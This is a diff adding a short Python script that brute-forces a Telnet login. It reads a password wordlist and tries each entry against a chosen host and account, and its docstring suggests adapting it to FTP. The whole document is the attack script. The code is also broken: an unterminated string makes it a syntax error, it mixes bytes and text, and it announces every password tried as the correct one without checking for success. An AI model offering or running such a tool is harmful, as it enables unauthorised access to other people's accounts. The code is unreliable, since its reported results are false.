@@ -1,0 +1,31 @@
+#! /usr/bin/python3
+
+"""Why capture credentials in the clear when you could do it the hard way? With some slight modifications, this script could be used to brute force other
+password based protocols like FTP."""
+
+
+import telnetlib
+
+host = input("IP address of Telnet server, ie 192.168.1.1 : ")
+user = input("Enter remote account name: ")
+PasswordList = input("Full path to password list: ")
+
+try:
+    with open(PasswordList, "r") as pswds:
+        for pswd in pswds:
+            pswd = pswd.strip('\r\n')
+            try:
+                tn = telnetlib.Telnet(host)
+                tn.read_until(b"login: ")
+                tn.write(user.encode('ascii') + "\n")
+                tn.read_until("password: ")
+                tn.write(pswd.encode('ascii') + "\n")
+                print("The password is " + pswd)
+            except:
+                print("Working...)
+except:
+    print("An unexpected error occurred. Please check the location file of your wordlist.")
+
+
+
+
